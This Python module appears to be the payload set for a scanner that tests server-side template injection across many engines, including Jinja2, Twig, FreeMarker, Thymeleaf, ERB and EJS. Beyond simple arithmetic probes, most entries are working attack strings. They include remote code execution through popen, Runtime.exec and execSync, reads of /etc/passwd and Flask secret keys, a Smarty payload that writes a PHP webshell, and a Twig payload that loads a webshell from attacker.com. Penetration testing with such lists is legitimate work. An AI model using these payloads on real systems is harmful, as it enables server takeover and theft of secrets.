"""
Server-Side Template Injection (SSTI) Payloads

Payloads for testing template injection vulnerabilities across various
template engines including:
- Jinja2 (Python/Flask)
- Django Templates
- Mako (Python)
- Tornado
- Thymeleaf (Java)
- FreeMarker (Java)
- Velocity (Java)
- Twig (PHP)
- Smarty (PHP)
- Blade (Laravel/PHP)
- ERB (Ruby)
- Pug/Jade (Node.js)
- EJS (Node.js)
- Handlebars (Node.js)
- Mustache
- ASP.NET Razor
"""

# Basic arithmetic test payloads - detect if template is being processed
SSTI_DETECTION_PAYLOADS = [
    # Universal math tests
    {
        "payload": "{{7*7}}",
        "expected": "49",
        "engines": ["jinja2", "twig", "angular", "vue"],
        "description": "Basic multiplication (double curly)",
    },
    {
        "payload": "${7*7}",
        "expected": "49",
        "engines": ["freemarker", "velocity", "spring"],
        "description": "Basic multiplication (dollar curly)",
    },
    {
        "payload": "#{7*7}",
        "expected": "49",
        "engines": ["thymeleaf", "spring"],
        "description": "Basic multiplication (hash curly)",
    },
    {
        "payload": "<%= 7*7 %>",
        "expected": "49",
        "engines": ["erb", "ejs", "asp"],
        "description": "Basic multiplication (ERB style)",
    },
    {
        "payload": "{7*7}",
        "expected": "49",
        "engines": ["smarty"],
        "description": "Basic multiplication (single curly)",
    },
    {
        "payload": "{{7*'7'}}",
        "expected": "7777777",
        "engines": ["jinja2"],
        "description": "String multiplication (Jinja2 specific)",
    },
    {
        "payload": "${7*7}",
        "expected": "49",
        "engines": ["mako", "freemarker"],
        "description": "Dollar syntax multiplication",
    },
    {
        "payload": "@(7*7)",
        "expected": "49",
        "engines": ["razor"],
        "description": "Razor syntax multiplication",
    },
    {
        "payload": "*{7*7}",
        "expected": "49",
        "engines": ["thymeleaf"],
        "description": "Thymeleaf selection expression",
    },
    {
        "payload": "~{7*7}",
        "expected": "49",
        "engines": ["thymeleaf"],
        "description": "Thymeleaf fragment expression",
    },

    # Concatenation tests
    {
        "payload": "{{'SSTI'+'TEST'}}",
        "expected": "SSTITEST",
        "engines": ["jinja2", "twig"],
        "description": "String concatenation",
    },
    {
        "payload": "${'SSTI'+'TEST'}",
        "expected": "SSTITEST",
        "engines": ["freemarker"],
        "description": "FreeMarker concatenation",
    },

    # Unique markers for definitive detection
    {
        "payload": "{{123456789*9876543210}}",
        "expected": "1219326311126352690",
        "engines": ["jinja2", "twig"],
        "description": "Large number multiplication (unique)",
    },
    {
        "payload": "${987654321*123456789}",
        "expected": "121932631112635269",
        "engines": ["freemarker", "velocity"],
        "description": "Large number multiplication (dollar)",
    },
]

# Jinja2 (Flask/Python) specific payloads
JINJA2_PAYLOADS = [
    # Basic tests
    {
        "payload": "{{config}}",
        "check": "Config",
        "description": "Config object access",
        "severity": "high",
    },
    {
        "payload": "{{config.items()}}",
        "check": "SECRET_KEY",
        "description": "Config items dump",
        "severity": "critical",
    },
    {
        "payload": "{{self}}",
        "check": "TemplateReference",
        "description": "Self reference",
        "severity": "medium",
    },
    {
        "payload": "{{request}}",
        "check": "Request",
        "description": "Request object access",
        "severity": "medium",
    },
    {
        "payload": "{{request.environ}}",
        "check": "environ",
        "description": "Request environment",
        "severity": "high",
    },

    # Class traversal for RCE
    {
        "payload": "{{''.__class__.__mro__}}",
        "check": "object",
        "description": "MRO traversal",
        "severity": "high",
    },
    {
        "payload": "{{''.__class__.__base__.__subclasses__()}}",
        "check": "subprocess",
        "description": "Subclass enumeration",
        "severity": "critical",
    },
    {
        "payload": "{{[].__class__.__base__.__subclasses__()}}",
        "check": "type",
        "description": "List subclass traversal",
        "severity": "critical",
    },
    {
        "payload": "{{{}.__class__.__base__.__subclasses__()}}",
        "check": "type",
        "description": "Dict subclass traversal",
        "severity": "critical",
    },

    # Global function access
    {
        "payload": "{{get_flashed_messages}}",
        "check": "function",
        "description": "Flask flashed messages",
        "severity": "medium",
    },
    {
        "payload": "{{url_for}}",
        "check": "function",
        "description": "Flask url_for access",
        "severity": "low",
    },

    # Lipsum trick
    {
        "payload": "{{lipsum}}",
        "check": "function",
        "description": "Lipsum function access",
        "severity": "high",
    },
    {
        "payload": "{{lipsum.__globals__}}",
        "check": "os",
        "description": "Lipsum globals access",
        "severity": "critical",
    },

    # Cycler trick
    {
        "payload": "{{cycler.__init__.__globals__.os}}",
        "check": "module",
        "description": "Cycler OS access",
        "severity": "critical",
    },

    # Joiner trick
    {
        "payload": "{{joiner.__init__.__globals__}}",
        "check": "builtins",
        "description": "Joiner globals",
        "severity": "critical",
    },

    # Namespace trick (Jinja2 2.10+)
    {
        "payload": "{{namespace.__init__.__globals__}}",
        "check": "builtins",
        "description": "Namespace globals",
        "severity": "critical",
    },
]

# RCE payloads (use with caution - for authorized testing only)
JINJA2_RCE_PAYLOADS = [
    # Reading /etc/passwd
    {
        "payload": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "check": "root:",
        "description": "File read via file subclass",
        "severity": "critical",
    },

    # popen RCE
    {
        "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "check": "uid=",
        "description": "OS popen via config",
        "severity": "critical",
    },

    # Import os
    {
        "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "check": "uid=",
        "description": "OS popen via cycler",
        "severity": "critical",
    },
]

# Twig (PHP) specific payloads
TWIG_PAYLOADS = [
    {
        "payload": "{{_self}}",
        "check": "__TwigTemplate",
        "description": "Self reference",
        "severity": "medium",
    },
    {
        "payload": "{{_self.env}}",
        "check": "Environment",
        "description": "Environment access",
        "severity": "high",
    },
    {
        "payload": "{{_self.env.getCharset()}}",
        "check": "UTF-8",
        "description": "Charset leak",
        "severity": "low",
    },
    {
        "payload": "{{['id']|filter('system')}}",
        "check": "uid=",
        "description": "System filter RCE",
        "severity": "critical",
    },
    {
        "payload": "{{['id']|map('system')}}",
        "check": "uid=",
        "description": "Map system RCE",
        "severity": "critical",
    },
    {
        "payload": "{{_self.env.setCache('ftp://attacker.com/webshell')}}",
        "check": "ftp",
        "description": "Cache path injection",
        "severity": "critical",
    },
]

# FreeMarker (Java) specific payloads
FREEMARKER_PAYLOADS = [
    {
        "payload": "${.version}",
        "check": "2.",
        "description": "Version disclosure",
        "severity": "low",
    },
    {
        "payload": "${.data_model}",
        "check": "model",
        "description": "Data model access",
        "severity": "medium",
    },
    {
        "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "check": "uid=",
        "description": "Execute class RCE",
        "severity": "critical",
    },
    {
        "payload": "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.ProcessBuilder\",\"id\").start()}",
        "check": "Process",
        "description": "ProcessBuilder RCE",
        "severity": "critical",
    },
    {
        "payload": "[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}",
        "check": "uid=",
        "description": "Square bracket syntax RCE",
        "severity": "critical",
    },
]

# Velocity (Java) specific payloads
VELOCITY_PAYLOADS = [
    {
        "payload": "#set($x=1+1)$x",
        "check": "2",
        "description": "Variable assignment",
        "severity": "low",
    },
    {
        "payload": "$class.inspect(\"java.lang.Runtime\")",
        "check": "Runtime",
        "description": "Class inspection",
        "severity": "high",
    },
    {
        "payload": "#set($runtime = $class.inspect(\"java.lang.Runtime\").type.getRuntime())#set($proc = $runtime.exec(\"id\"))$proc.waitFor()",
        "check": "0",
        "description": "Runtime exec RCE",
        "severity": "critical",
    },
]

# Thymeleaf (Java/Spring) specific payloads
THYMELEAF_PAYLOADS = [
    {
        "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "check": "Process",
        "description": "SpEL Runtime exec",
        "severity": "critical",
    },
    {
        "payload": "*{T(java.lang.Runtime).getRuntime().exec('id')}",
        "check": "Process",
        "description": "Selection expression RCE",
        "severity": "critical",
    },
    {
        "payload": "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        "check": "Process",
        "description": "Preprocessor RCE",
        "severity": "critical",
    },
    {
        "payload": "${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}",
        "check": "Process",
        "description": "OGNL injection",
        "severity": "critical",
    },
]

# Smarty (PHP) specific payloads
SMARTY_PAYLOADS = [
    {
        "payload": "{$smarty.version}",
        "check": "Smarty",
        "description": "Version disclosure",
        "severity": "low",
    },
    {
        "payload": "{php}echo `id`;{/php}",
        "check": "uid=",
        "description": "PHP tag RCE (deprecated)",
        "severity": "critical",
    },
    {
        "payload": "{system('id')}",
        "check": "uid=",
        "description": "System function RCE",
        "severity": "critical",
    },
    {
        "payload": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        "check": "passthru",
        "description": "File write RCE",
        "severity": "critical",
    },
]

# ERB (Ruby) specific payloads
ERB_PAYLOADS = [
    {
        "payload": "<%= 7*7 %>",
        "check": "49",
        "description": "Basic math",
        "severity": "low",
    },
    {
        "payload": "<%= Dir.entries('/') %>",
        "check": "etc",
        "description": "Directory listing",
        "severity": "high",
    },
    {
        "payload": "<%= File.read('/etc/passwd') %>",
        "check": "root:",
        "description": "File read",
        "severity": "critical",
    },
    {
        "payload": "<%= `id` %>",
        "check": "uid=",
        "description": "Backtick RCE",
        "severity": "critical",
    },
    {
        "payload": "<%= system('id') %>",
        "check": "uid=",
        "description": "System RCE",
        "severity": "critical",
    },
]

# Pug/Jade (Node.js) specific payloads
PUG_PAYLOADS = [
    {
        "payload": "#{7*7}",
        "check": "49",
        "description": "Basic math",
        "severity": "low",
    },
    {
        "payload": "#{root.process.mainModule.require('child_process').execSync('id')}",
        "check": "uid=",
        "description": "Child process RCE",
        "severity": "critical",
    },
    {
        "payload": "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad('child_process').execSync('id')}()}",
        "check": "uid=",
        "description": "Module load RCE",
        "severity": "critical",
    },
]

# EJS (Node.js) specific payloads
EJS_PAYLOADS = [
    {
        "payload": "<%= 7*7 %>",
        "check": "49",
        "description": "Basic math",
        "severity": "low",
    },
    {
        "payload": "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>",
        "check": "uid=",
        "description": "Child process RCE",
        "severity": "critical",
    },
    {
        "payload": "<%- global.process.mainModule.require('child_process').execSync('id') %>",
        "check": "uid=",
        "description": "Unescaped RCE",
        "severity": "critical",
    },
]

# Handlebars (Node.js) specific payloads
HANDLEBARS_PAYLOADS = [
    {
        "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
        "check": "uid=",
        "description": "Prototype pollution RCE",
        "severity": "critical",
    },
]

# Mako (Python) specific payloads
MAKO_PAYLOADS = [
    {
        "payload": "${7*7}",
        "check": "49",
        "description": "Basic math",
        "severity": "low",
    },
    {
        "payload": "${self.module.cache.util.os.popen('id').read()}",
        "check": "uid=",
        "description": "OS popen RCE",
        "severity": "critical",
    },
    {
        "payload": "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
        "check": "uid=",
        "description": "Import os RCE",
        "severity": "critical",
    },
]

# Tornado (Python) specific payloads
TORNADO_PAYLOADS = [
    {
        "payload": "{{7*7}}",
        "check": "49",
        "description": "Basic math",
        "severity": "low",
    },
    {
        "payload": "{%import os%}{{os.popen('id').read()}}",
        "check": "uid=",
        "description": "Import os RCE",
        "severity": "critical",
    },
]

# Django Templates specific payloads
DJANGO_PAYLOADS = [
    {
        "payload": "{{settings.SECRET_KEY}}",
        "check": "key",
        "description": "Secret key disclosure",
        "severity": "critical",
    },
    {
        "payload": "{{debug}}",
        "check": "True",
        "description": "Debug mode check",
        "severity": "medium",
    },
    # Django is more restrictive but SSTI can still occur with custom tags
    {
        "payload": "{% debug %}",
        "check": "settings",
        "description": "Debug tag",
        "severity": "medium",
    },
]

# Razor (ASP.NET) specific payloads
RAZOR_PAYLOADS = [
    {
        "payload": "@(7*7)",
        "check": "49",
        "description": "Basic math",
        "severity": "low",
    },
    {
        "payload": "@System.IO.File.ReadAllText(\"C:\\\\Windows\\\\win.ini\")",
        "check": "fonts",
        "description": "File read",
        "severity": "critical",
    },
    {
        "payload": "@{System.Diagnostics.Process.Start(\"cmd.exe\", \"/c id\");}",
        "check": "Process",
        "description": "Process start RCE",
        "severity": "critical",
    },
]

# Combined polyglot payloads that work across multiple engines
POLYGLOT_PAYLOADS = [
    {
        "payload": "{{7*7}}${7*7}<%= 7*7 %>{7*7}#{7*7}",
        "check": "49",
        "description": "Multi-engine polyglot",
        "severity": "high",
    },
    {
        "payload": "${{<%[%'\"}}%\\.",
        "check": "error",
        "description": "Error-based detection",
        "severity": "low",
    },
]

# All payloads combined for comprehensive testing
ALL_SSTI_PAYLOADS = (
    SSTI_DETECTION_PAYLOADS +
    JINJA2_PAYLOADS +
    TWIG_PAYLOADS +
    FREEMARKER_PAYLOADS +
    VELOCITY_PAYLOADS +
    THYMELEAF_PAYLOADS +
    SMARTY_PAYLOADS +
    ERB_PAYLOADS +
    PUG_PAYLOADS +
    EJS_PAYLOADS +
    MAKO_PAYLOADS +
    TORNADO_PAYLOADS +
    DJANGO_PAYLOADS +
    RAZOR_PAYLOADS +
    POLYGLOT_PAYLOADS
)

# URL parameters commonly vulnerable to SSTI
SSTI_VULNERABLE_PARAMS = [
    "name",
    "template",
    "page",
    "view",
    "content",
    "message",
    "msg",
    "text",
    "title",
    "body",
    "html",
    "email",
    "subject",
    "desc",
    "description",
    "comment",
    "preview",
    "render",
    "format",
    "layout",
    "output",
    "display",
    "q",
    "query",
    "search",
    "input",
    "data",
    "value",
    "redirect",
    "url",
    "path",
    "file",
    "filename",
]
